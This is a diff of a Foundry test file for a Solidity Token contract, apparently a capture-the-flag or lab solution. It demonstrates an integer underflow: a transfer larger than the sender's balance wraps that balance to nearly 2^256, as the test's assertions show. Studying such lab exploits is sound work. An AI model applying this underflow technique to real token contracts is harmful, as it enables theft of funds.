@@ -4,20 +4,25 @@ pragma solidity 0.8.0;
 import "forge-std/Test.sol";
 import "../src/Token.sol";
 
+// exploit overflow
 contract TokenTest is Test {
-    Token token;
-    address alice = makeAddr("alice");
+    Token instance;
 
     function setUp() public {
-        token = new Token(1000);
+        instance = new Token(100);
     }
 
     function test() public {
-        assertEq(token.balanceOf(alice), 0);
+        address alice = makeAddr("alice");
 
-        token.transfer(alice, 1001);
-        assertEq(token.balanceOf(alice), 1001);
+        instance.transfer(alice, 20);
+        assertEq(instance.balanceOf(alice), 20);
+        assertEq(instance.balanceOf(address(this)), 80);
 
-        console.log("address(this): ", token.balanceOf(address(this)));
+        instance.transfer(alice, 1e18);
+        assertEq(instance.balanceOf(alice), 1e18 + 20);
+
+        // 80 + -(1e18 - 2^256) = (type(uint256).max + 1) (= 2^256) - 1e18 + 80
+        assertEq(instance.balanceOf(address(this)), type(uint256).max - 1e18 + 80 + 1);
     }
 }
